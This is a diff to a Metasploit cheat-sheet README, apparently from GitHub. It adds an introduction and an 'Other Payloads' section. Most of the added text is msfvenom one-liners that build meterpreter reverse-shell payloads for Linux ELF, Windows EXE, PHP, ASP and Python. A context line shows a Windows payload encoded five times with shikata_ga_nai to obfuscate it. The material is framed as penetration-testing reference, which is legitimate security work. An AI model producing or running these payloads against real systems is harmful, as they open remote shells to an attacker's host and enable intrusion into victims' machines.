@@ -7,7 +7,9 @@
 <img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/0a2e32cd-0949-4d48-9f1b-95faf99a7b96" height="300px" width="800px">
 </p>
 
+<br>
 
+### Introduction:
 
 Metasploit is the ultimate penetration testing tool for offensive security. And it’s so easy to use that even you could claim to be a hacker just by running a few commands. Also, it is incredibly powerful as well. This guide is a general overview of how Metasploit can be used.
 **********
@@ -354,6 +356,42 @@ Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output
 ```
 $ msfvenom -p windows/meterpreter/ reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > msf.exe
 ```
+
+<br>
+
+Other Payloads:
+
+> Linux Executable and Linkable Format (elf)
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+```
+
+> Windows
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+```
+
+> PHP
+
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+```
+
+> ASP
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+```
+
+> Python
+
+```
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+```
+
+
 <br>
 
 <h3>Metasploit Meterpreter</h3>
